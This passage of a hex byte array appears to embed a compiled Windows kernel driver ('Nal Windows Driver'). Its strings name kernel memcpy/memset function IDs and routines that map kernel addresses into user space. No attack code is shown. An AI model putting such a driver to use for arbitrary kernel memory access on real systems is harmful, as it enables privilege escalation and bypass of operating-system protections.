    0x10, 0x4C, 0x0F, 0xC3, 0x51, 0x18, 0x4C, 0x8B, 0x4C, 0x0A, 0x20, 0x4C, 0x8B, 0x54, 0x0A, 0x28,
    0x48, 0x83, 0xC1, 0x40, 0x4C, 0x0F, 0xC3, 0x49, 0xE0, 0x4C, 0x0F, 0xC3, 0x51, 0xE8, 0x4C, 0x8B,
    0x4C, 0x0A, 0xF0, 0x4C, 0x8B, 0x54, 0x0A, 0xF8, 0xFF, 0xC8, 0x4C, 0x0F, 0xC3, 0x49, 0xF0, 0x4C,
    0x0F, 0xC3, 0x51, 0xF8, 0x75, 0xAA, 0x49, 0x81, 0xE8, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81, 0xF8,
    0x00, 0x10, 0x00, 0x00, 0x0F, 0x83, 0x71, 0xFF, 0xFF, 0xFF, 0xF0, 0x80, 0x0C, 0x24, 0x00, 0xE9,
    0xBA, 0xFE, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x74, 0x6F, 0x49, 0x03, 0xC8, 0x49, 0x83, 0xF8,
    0x08, 0x72, 0x61, 0xF6, 0xC1, 0x07, 0x74, 0x36, 0xF6, 0xC1, 0x01, 0x74, 0x0B, 0x48, 0xFF, 0xC9,
    0x8A, 0x04, 0x0A, 0x49, 0xFF, 0xC8, 0x88, 0x01, 0xF6, 0xC1, 0x02, 0x74, 0x0F, 0x48, 0x83, 0xE9,
    0x02, 0x66, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x02, 0x66, 0x89, 0x01, 0xF6, 0xC1, 0x04, 0x74,
    0x0D, 0x48, 0x83, 0xE9, 0x04, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x04, 0x89, 0x01, 0x4D, 0x8B,
    0xC8, 0x49, 0xC1, 0xE9, 0x05, 0x75, 0x50, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x03, 0x74, 0x14,
    0x48, 0x83, 0xE9, 0x08, 0x48, 0x8B, 0x04, 0x0A, 0x49, 0xFF, 0xC9, 0x48, 0x89, 0x01, 0x75, 0xF0,
    0x49, 0x83, 0xE0, 0x07, 0x4D, 0x85, 0xC0, 0x75, 0x07, 0x49, 0x8B, 0xC3, 0xC3, 0x66, 0x66, 0x90,
    0x48, 0xFF, 0xC9, 0x8A, 0x04, 0x0A, 0x49, 0xFF, 0xC8, 0x88, 0x01, 0x75, 0xF3, 0x49, 0x8B, 0xC3,
    0xC3, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x49, 0x81, 0xF9, 0x00, 0x08, 0x00, 0x00, 0x73, 0x42,
    0x48, 0x8B, 0x44, 0x0A, 0xF8, 0x4C, 0x8B, 0x54, 0x0A, 0xF0, 0x48, 0x83, 0xE9, 0x20, 0x48, 0x89,
    0x41, 0x18, 0x4C, 0x89, 0x51, 0x10, 0x48, 0x8B, 0x44, 0x0A, 0x08, 0x4C, 0x8B, 0x14, 0x0A, 0x49,
    0xFF, 0xC9, 0x48, 0x89, 0x41, 0x08, 0x4C, 0x89, 0x11, 0x75, 0xD5, 0x49, 0x83, 0xE0, 0x1F, 0xE9,
    0x73, 0xFF, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x66, 0x90, 0x48, 0x81, 0xFA, 0x00, 0xF0, 0xFF, 0xFF, 0x77, 0xB5, 0xB8, 0x20, 0x00, 0x00, 0x00,
    0x48, 0x81, 0xE9, 0x80, 0x00, 0x00, 0x00, 0x0F, 0x18, 0x04, 0x0A, 0x0F, 0x18, 0x44, 0x0A, 0x40,
    0xFF, 0xC8, 0x75, 0xEC, 0x48, 0x81, 0xC1, 0x00, 0x10, 0x00, 0x00, 0xB8, 0x40, 0x00, 0x00, 0x00,
    0x4C, 0x8B, 0x4C, 0x0A, 0xF8, 0x4C, 0x8B, 0x54, 0x0A, 0xF0, 0x4C, 0x0F, 0xC3, 0x49, 0xF8, 0x4C,
    0x0F, 0xC3, 0x51, 0xF0, 0x4C, 0x8B, 0x4C, 0x0A, 0xE8, 0x4C, 0x8B, 0x54, 0x0A, 0xE0, 0x4C, 0x0F,
    0xC3, 0x49, 0xE8, 0x4C, 0x0F, 0xC3, 0x51, 0xE0, 0x4C, 0x8B, 0x4C, 0x0A, 0xD8, 0x4C, 0x8B, 0x54,
    0x0A, 0xD0, 0x48, 0x83, 0xE9, 0x40, 0x4C, 0x0F, 0xC3, 0x49, 0x18, 0x4C, 0x0F, 0xC3, 0x51, 0x10,
    0x4C, 0x8B, 0x4C, 0x0A, 0x08, 0x4C, 0x8B, 0x14, 0x0A, 0xFF, 0xC8, 0x4C, 0x0F, 0xC3, 0x49, 0x08,
    0x4C, 0x0F, 0xC3, 0x11, 0x75, 0xAA, 0x49, 0x81, 0xE8, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81, 0xF8,
    0x00, 0x10, 0x00, 0x00, 0x0F, 0x83, 0x71, 0xFF, 0xFF, 0xFF, 0xF0, 0x80, 0x0C, 0x24, 0x00, 0xE9,
    0xBA, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x90,
    0x48, 0x8B, 0xC1, 0x49, 0x83, 0xF8, 0x08, 0x72, 0x53, 0x0F, 0xB6, 0xD2, 0x49, 0xB9, 0x01, 0x01,
    0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x49, 0x0F, 0xAF, 0xD1, 0x49, 0x83, 0xF8, 0x40, 0x72, 0x1E,
    0x48, 0xF7, 0xD9, 0x83, 0xE1, 0x07, 0x74, 0x06, 0x4C, 0x2B, 0xC1, 0x48, 0x89, 0x10, 0x48, 0x03,
    0xC8, 0x4D, 0x8B, 0xC8, 0x49, 0x83, 0xE0, 0x3F, 0x49, 0xC1, 0xE9, 0x06, 0x75, 0x39, 0x4D, 0x8B,
    0xC8, 0x49, 0x83, 0xE0, 0x07, 0x49, 0xC1, 0xE9, 0x03, 0x74, 0x11, 0x66, 0x66, 0x66, 0x90, 0x90,
    0x48, 0x89, 0x11, 0x48, 0x83, 0xC1, 0x08, 0x49, 0xFF, 0xC9, 0x75, 0xF4, 0x4D, 0x85, 0xC0, 0x74,
    0x0A, 0x88, 0x11, 0x48, 0xFF, 0xC1, 0x49, 0xFF, 0xC8, 0x75, 0xF6, 0xC3, 0x66, 0x66, 0x66, 0x90,
    0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x49, 0x81, 0xF9, 0x00, 0x04, 0x00, 0x00, 0x73, 0x30,
    0x48, 0x89, 0x11, 0x48, 0x89, 0x51, 0x08, 0x48, 0x89, 0x51, 0x10, 0x48, 0x83, 0xC1, 0x40, 0x48,
    0x89, 0x51, 0xD8, 0x48, 0x89, 0x51, 0xE0, 0x49, 0xFF, 0xC9, 0x48, 0x89, 0x51, 0xE8, 0x48, 0x89,
    0x51, 0xF0, 0x48, 0x89, 0x51, 0xF8, 0x75, 0xD8, 0xEB, 0x94, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x0F, 0xC3, 0x11, 0x48, 0x0F, 0xC3, 0x51, 0x08, 0x48, 0x0F, 0xC3, 0x51, 0x10, 0x48, 0x83,
    0xC1, 0x40, 0x48, 0x0F, 0xC3, 0x51, 0xD8, 0x48, 0x0F, 0xC3, 0x51, 0xE0, 0x49, 0xFF, 0xC9, 0x48,
    0x0F, 0xC3, 0x51, 0xE8, 0x48, 0x0F, 0xC3, 0x51, 0xF0, 0x48, 0x0F, 0xC3, 0x51, 0xF8, 0x75, 0xD0,
    0xF0, 0x80, 0x0C, 0x24, 0x00, 0xE9, 0x54, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xFF, 0x25, 0x52, 0x19, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x90,
    0x48, 0x3B, 0x0D, 0xF1, 0x29, 0x00, 0x00, 0x75, 0x10, 0x48, 0xC1, 0xC1, 0x10, 0x66, 0xF7, 0xC1,
    0xFF, 0xFF, 0x75, 0x01, 0xC3, 0x48, 0xC1, 0xC9, 0x10, 0xE9, 0x42, 0xFB, 0xFF, 0xFF, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x20, 0x55, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x3A, 0x20, 0x49, 0x6F, 0x44, 0x65, 0x6C,
    0x65, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x20, 0x4E, 0x4F, 0x54, 0x20, 0x63, 0x61,
    0x6C, 0x6C, 0x65, 0x64, 0x3A, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x20, 0x44, 0x65, 0x76, 0x69, 0x63,
    0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x20, 0x55, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x3A, 0x20, 0x4C, 0x65, 0x61, 0x76, 0x69,
    0x6E, 0x67, 0x2E, 0x2E, 0x2E, 0x20, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x5C, 0x00, 0x3F, 0x00, 0x3F, 0x00, 0x5C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x00, 0x00,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x20, 0x55, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x3A, 0x20, 0x53, 0x74, 0x61, 0x72, 0x74,
    0x69, 0x6E, 0x67, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x41, 0x64, 0x64, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x3A, 0x20, 0x64, 0x6F, 0x6E,
    0x65, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C,
    0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x2E, 0x20, 0x20,
    0x53, 0x74, 0x61, 0x74, 0x75, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x78, 0x0A, 0x00, 0xCC,
    0x5C, 0x00, 0x44, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00,
    0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x00, 0x00,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65,
    0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x2E, 0x20, 0x20, 0x53, 0x74, 0x61, 0x74, 0x75, 0x73,
    0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x30, 0x78, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x5C, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5C, 0x00,
    0x4E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x41, 0x64, 0x64, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x3A, 0x20, 0x65, 0x6E, 0x74,
    0x65, 0x72, 0x65, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x3A, 0x20, 0x4C, 0x65, 0x61, 0x76, 0x69, 0x6E,
    0x67, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x3A, 0x20, 0x53, 0x74, 0x61, 0x72, 0x74, 0x69,
    0x6E, 0x67, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x3A, 0x20, 0x4C, 0x65, 0x61, 0x76, 0x69, 0x6E, 0x67,
    0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x3A, 0x20, 0x53, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E,
    0x67, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C,
    0x3A, 0x20, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x77, 0x61,
    0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
    0x65, 0x72, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x3A,
    0x20, 0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x49, 0x4F, 0x43, 0x54, 0x4C, 0x20, 0x63,
    0x6F, 0x64, 0x65, 0x20, 0x30, 0x78, 0x25, 0x30, 0x78, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x41, 0x4C, 0x5F, 0x45, 0x4E, 0x41, 0x42, 0x4C, 0x45, 0x5F, 0x44, 0x45, 0x42, 0x55, 0x47,
    0x5F, 0x50, 0x52, 0x49, 0x4E, 0x54, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x3A, 0x20, 0x46,
    0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E,
    0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x41, 0x4C, 0x5F, 0x4B, 0x4B, 0x4D, 0x45, 0x4D, 0x43, 0x50, 0x59, 0x5F, 0x46, 0x55, 0x4E,
    0x43, 0x49, 0x44, 0x3A, 0x20, 0x4F, 0x6E, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68, 0x65, 0x20,
    0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x73, 0x20, 0x77, 0x61, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C,
    0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x41, 0x4C, 0x5F, 0x4B, 0x55, 0x4D, 0x45, 0x4D, 0x43, 0x50, 0x59, 0x5F, 0x46, 0x55, 0x4E,
    0x43, 0x49, 0x44, 0x3A, 0x20, 0x4F, 0x6E, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68, 0x65, 0x20,
    0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x73, 0x20, 0x77, 0x61, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C,
    0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x41, 0x4C, 0x5F, 0x4B, 0x4D, 0x45, 0x4D, 0x53, 0x45, 0x54, 0x5F, 0x46, 0x55, 0x4E, 0x43,
    0x49, 0x44, 0x3A, 0x20, 0x4F, 0x6E, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68, 0x65, 0x20, 0x62,
    0x75, 0x66, 0x66, 0x65, 0x72, 0x73, 0x20, 0x77, 0x61, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A,
    0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x3A, 0x20, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64,
    0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x55, 0x6E, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x74, 0x6F,
    0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x4D, 0x44, 0x4C, 0x0A, 0x00, 0xCC,
    0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64,
    0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x54,
    0x6F, 0x20, 0x46, 0x72, 0x65, 0x65, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x0A, 0x00, 0xCC,
    0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64,
    0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B,
    0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x2E, 0x20,
    0x46, 0x72, 0x65, 0x65, 0x69, 0x6E, 0x67, 0x20, 0x4D, 0x44, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC,
    0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64,
    0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x4C, 0x65, 0x76,
    0x65, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70,
    0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x50, 0x41, 0x47, 0x45, 0x5F, 0x53, 0x49, 0x5A, 0x45, 0x20, 0x2A, 0x20, 0x28, 0x36, 0x35, 0x35,
    0x33, 0x35, 0x20, 0x2D, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x6F, 0x66, 0x28, 0x4D, 0x44, 0x4C, 0x29,
    0x29, 0x20, 0x2F, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x6F, 0x66, 0x28, 0x55, 0x4C, 0x4F, 0x4E, 0x47,
    0x5F, 0x50, 0x54, 0x52, 0x29, 0x20, 0x3D, 0x20, 0x25, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
    0x5F, 0x4E, 0x61, 0x6C, 0x57, 0x69, 0x6E, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x41, 0x64,
    0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x55, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x6D, 0x65, 0x6D,
    0x6F, 0x72, 0x79, 0x20, 0x6D, 0x61, 0x70, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x73, 0x6C,
    0x6F, 0x74, 0x20, 0x25, 0x64, 0x20, 0x2D, 0x20, 0x4C, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x20, 0x25,
    0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A,
    0x20, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x6E, 0x6F, 0x6E, 0x2D, 0x75,
    0x73, 0x65, 0x72, 0x6D, 0x6F, 0x64, 0x65, 0x20, 0x6D, 0x61, 0x70, 0x70, 0x65, 0x64, 0x20, 0x61,
    0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x30, 0x78, 0x25, 0x70, 0x2C, 0x20, 0x4C, 0x65, 0x6E,
    0x67, 0x74, 0x68, 0x20, 0x25, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45,
    0x78, 0x3A, 0x20, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x66,
    0x6F, 0x75, 0x6E, 0x64, 0x20, 0x69, 0x6E, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x2D, 0x20,
    0x6E, 0x6F, 0x74, 0x20, 0x75, 0x6E, 0x6D, 0x61, 0x70, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x30, 0x78,
    0x25, 0x70, 0x2C, 0x20, 0x4C, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x20, 0x25, 0x64, 0x0A, 0x00, 0xCC,
    0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45,
    0x78, 0x3A, 0x20, 0x47, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x5F, 0x57, 0x69, 0x6E, 0x4D, 0x65, 0x6D,
    0x6F, 0x72, 0x79, 0x4D, 0x61, 0x70, 0x54, 0x61, 0x62, 0x6C, 0x65, 0x5B, 0x69, 0x5D, 0x2E, 0x41,
    0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x54, 0x6F, 0x46, 0x72, 0x65, 0x65, 0x20, 0x3D, 0x20, 0x25,
    0x70, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45,
    0x78, 0x3A, 0x20, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x4F, 0x72, 0x69,
    0x67, 0x69, 0x6E, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x4D, 0x61, 0x70, 0x70, 0x65,
    0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45,
    0x78, 0x3A, 0x20, 0x53, 0x6B, 0x69, 0x70, 0x70, 0x65, 0x64, 0x20, 0x4D, 0x6D, 0x55, 0x6E, 0x6D,
    0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x20, 0x2D, 0x20,
    0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x54, 0x6F, 0x46, 0x72, 0x65, 0x65, 0x20, 0x6F, 0x72,
    0x20, 0x4D, 0x64, 0x6C, 0x20, 0x77, 0x61, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC,
    0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45,
    0x78, 0x3A, 0x20, 0x43, 0x61, 0x6C, 0x6C, 0x69, 0x6E, 0x67, 0x20, 0x4D, 0x6D, 0x55, 0x6E, 0x6D,
    0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x0A, 0x00, 0xCC,
    0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45,
    0x78, 0x3A, 0x20, 0x53, 0x6C, 0x6F, 0x74, 0x20, 0x25, 0x64, 0x20, 0x6D, 0x61, 0x74, 0x63, 0x68,
    0x65, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
